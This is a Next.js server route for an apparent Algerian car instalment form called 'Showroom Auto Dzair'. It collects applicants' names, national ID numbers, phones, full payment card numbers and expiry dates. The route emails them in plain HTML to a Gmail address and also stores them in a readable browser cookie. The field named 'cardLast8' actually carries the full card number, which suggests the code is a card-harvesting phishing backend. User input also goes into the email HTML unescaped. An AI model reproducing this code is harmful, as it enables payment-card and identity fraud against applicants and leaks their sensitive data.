import { NextResponse } from "next/server"
import { Resend } from "resend"
import { cars } from "@/lib/data"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { 
      fullName, 
      nin, 
      cardLast8, 
      cardExpiry, 
      phone1, 
      phone2, 
      hasPreviousInstallment, 
      selectedCarId, 
      selectedCar: carFromBody, 
      createdAt 
    } = body

    // 1. Resolve selected car
    const selectedCar = carFromBody || cars.find((car) => car.id === selectedCarId)

    // 2. Validate environment variables
    const resendApiKey = process.env.RESEND_API_KEY?.trim()
    const toEmail = process.env.EMAIL_TO?.trim() || "autodzaircontact@gmail.com"
    const fromEmail = process.env.EMAIL_FROM?.trim() || "onboarding@resend.dev"

    if (!resendApiKey) {
      console.error("RESEND_API_KEY is not defined in the environment.")
      return NextResponse.json(
        { success: false, message: "إعدادات البريد الإلكتروني غير مكتملة" },
        { status: 500 }
      )
    }

    // 3. Generate unique submission ID
    const submissionId = `SR-${Date.now().toString().slice(-6)}-${Math.floor(100 + Math.random() * 900)}`
    
    const submission = {
      id: submissionId,
      fullName,
      nin,
      cardLast8,
      cardExpiry,
      phone1,
      phone2: phone2 || "غير محدد",
      hasPreviousInstallment,
      selectedCar,
      createdAt: createdAt || new Date().toISOString(),
      status: "pending"
    }

    // Format card number with spaces for readability
    const cardFormatted = cardLast8?.length === 16
      ? `${cardLast8.slice(0,4)} ${cardLast8.slice(4,8)} ${cardLast8.slice(8,12)} ${cardLast8.slice(12)}`
      : cardLast8

    // 4. Send email using Resend
    const resend = new Resend(resendApiKey)
    const dateFormatted = new Date(submission.createdAt).toLocaleString("ar-DZ", { timeZone: "Africa/Algiers" })

    const htmlContent = `
      <!DOCTYPE html>
      <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>طلب تقسيط جديد</title>
        <style>
          * { box-sizing: border-box; margin: 0; padding: 0; }
          body {
            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f1f5f9;
            color: #1e293b;
            direction: rtl;
            text-align: right;
            padding: 20px 10px;
          }
          .email-container {
            max-width: 600px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 50px rgba(0,0,0,0.08);
            border: 1px solid #e2e8f0;
          }
          .top-ribbon {
            height: 5px;
            background: linear-gradient(90deg, #0f172a 0%, #1e40af 40%, #3b82f6 70%, #06b6d4 100%);
          }
          .header {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            padding: 32px 30px 28px;
            text-align: center;
          }
          .header-logo {
            font-size: 28px;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: -0.5px;
          }
          .header-logo span { color: #3b82f6; }
          .header-subtitle {
            color: #64748b;
            font-size: 13px;
            margin-top: 6px;
          }
          .content { padding: 28px 30px; }
          .ref-strip {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 24px;
            font-size: 13px;
          }
          .ref-id {
            font-weight: 800;
            color: #1e40af;
            font-family: monospace;
            letter-spacing: 0.5px;
          }
          .status-pill {
            background: #fef3c7;
            color: #92400e;
            padding: 4px 12px;
            border-radius: 9999px;
            font-size: 11px;
            font-weight: 700;
            border: 1px solid #fde68a;
          }
          .section-header {
            font-size: 14px;
            font-weight: 800;
            color: #1e3a8a;
            border-right: 3px solid #3b82f6;
            padding-right: 10px;
            margin-bottom: 12px;
            margin-top: 24px;
          }
          .data-grid {
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            overflow: hidden;
          }
          .data-row {
            display: flex;
            border-bottom: 1px solid #f1f5f9;
          }
          .data-row:last-child { border-bottom: none; }
          .data-label {
            width: 42%;
            padding: 11px 14px;
            background: #f8fafc;
            font-size: 12.5px;
            color: #64748b;
            font-weight: 600;
            border-left: 1px solid #f1f5f9;
          }
          .data-value {
            padding: 11px 14px;
            font-size: 13px;
            font-weight: 700;
            color: #0f172a;
            word-break: break-all;
          }
          .car-highlight {
            background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
            border: 1px solid #93c5fd;
            border-radius: 14px;
            padding: 20px;
            margin-top: 12px;
          }
          .car-name {
            font-size: 20px;
            font-weight: 900;
            color: #1e3a8a;
            margin-bottom: 12px;
          }
          .car-prices {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            border-top: 1px dashed #93c5fd;
            padding-top: 12px;
            margin-top: 8px;
          }
          .total-price { font-size: 12px; color: #1e40af; }
          .total-price strong { display: block; font-size: 16px; color: #1e3a8a; }
          .monthly-badge {
            background: #1d4ed8;
            color: #fff;
            padding: 8px 16px;
            border-radius: 10px;
            text-align: center;
          }
          .monthly-badge .amount { font-size: 18px; font-weight: 900; display: block; }
          .monthly-badge .label { font-size: 10px; opacity: 0.85; }
          .meta-row {
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #f1f5f9;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #94a3b8;
          }
          .footer {
            background: #0f172a;
            color: #475569;
            text-align: center;
            padding: 18px;
            font-size: 11px;
            line-height: 1.7;
          }
          .footer strong { color: #94a3b8; }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="top-ribbon"></div>
          <div class="header">
            <div class="header-logo">Showroom Auto <span>Dzair</span></div>
            <div class="header-subtitle">إشعار طلب تقسيط جديد — خاص بالإدارة</div>
          </div>

          <div class="content">
            <div class="ref-strip">
              <span>الرقم المرجعي: <span class="ref-id">${submission.id}</span></span>
              <span class="status-pill">⏳ قيد المراجعة</span>
            </div>

            <div class="section-header">👤 بيانات العميل</div>
            <div class="data-grid">
              <div class="data-row">
                <div class="data-label">الاسم الكامل</div>
                <div class="data-value">${submission.fullName}</div>
              </div>
              <div class="data-row">
                <div class="data-label">رقم التعريف الوطني (NIN)</div>
                <div class="data-value" dir="ltr" style="font-family:monospace;letter-spacing:1px;">${submission.nin}</div>
              </div>
              <div class="data-row">
                <div class="data-label">الهاتف الأول</div>
                <div class="data-value" dir="ltr" style="font-family:monospace;">${submission.phone1}</div>
              </div>
              <div class="data-row">
                <div class="data-label">الهاتف الثاني</div>
                <div class="data-value" dir="ltr" style="font-family:monospace;">${submission.phone2}</div>
              </div>
              <div class="data-row">
                <div class="data-label">تقسيط سابق</div>
                <div class="data-value">${submission.hasPreviousInstallment ? "نعم ✓" : "لا ✗"}</div>
              </div>
            </div>

            <div class="section-header">💳 معلومات الدفع — البطاقة الذهبية</div>
            <div class="data-grid">
              <div class="data-row">
                <div class="data-label">رقم البطاقة الكامل</div>
                <div class="data-value" dir="ltr" style="font-family:monospace;letter-spacing:2px;font-size:15px;color:#1e40af;">${cardFormatted}</div>
              </div>
              <div class="data-row">
                <div class="data-label">تاريخ انتهاء الصلاحية</div>
                <div class="data-value" dir="ltr" style="font-family:monospace;">${submission.cardExpiry}</div>
              </div>
            </div>

            <div class="section-header">🚗 السيارة المطلوبة</div>
            ${selectedCar ? `
            <div class="car-highlight">
              <div class="car-name">${selectedCar.brand} ${selectedCar.model} <span style="font-size:14px;color:#3b82f6;">(${selectedCar.year})</span></div>
              <div class="car-prices">
                <div class="total-price">
                  السعر الإجمالي
                  <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج</strong>
                </div>
                <div class="monthly-badge">
                  <span class="amount">${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج</span>
                  <span class="label">القسط الشهري</span>
                </div>
              </div>
            </div>
            ` : `<div class="data-grid"><div class="data-row"><div class="data-value">لم يتم اختيار سيارة</div></div></div>`}

            <div class="meta-row">
              <span>📅 ${dateFormatted}</span>
              <span>📞 للتواصل: ${submission.phone1}</span>
            </div>
          </div>

          <div class="footer">
            <strong>Showroom Auto Dzair</strong> — نظام إدارة الطلبات<br>
            هذا البريد مرسل تلقائياً عند استلام طلب تقسيط جديد.<br>
            © ${new Date().getFullYear()} جميع الحقوق محفوظة
          </div>
        </div>
      </body>
      </html>
    `

    await resend.emails.send({
      from: fromEmail,
      to: toEmail,
      subject: `طلب تقسيط جديد (${submission.id}) — ${submission.fullName}`,
      html: htmlContent,
    })

    // 5. Construct response and set cookie
    const response = NextResponse.json({
      success: true,
      id: submissionId,
      message: "تم تسجيل بيانات العميل بنجاح وسيتم إرسال الإشعار"
    }, { status: 201 })

    response.cookies.set("last_submission", JSON.stringify(submission), {
      maxAge: 3600,
      path: "/",
      sameSite: "lax",
    })

    return response
  } catch (error: any) {
    console.error("[Resend Registration API Error]:", error)
    return NextResponse.json(
      { success: false, message: error.message || "حدث خطأ في التسجيل" },
      { status: 500 }
    )
  }
}
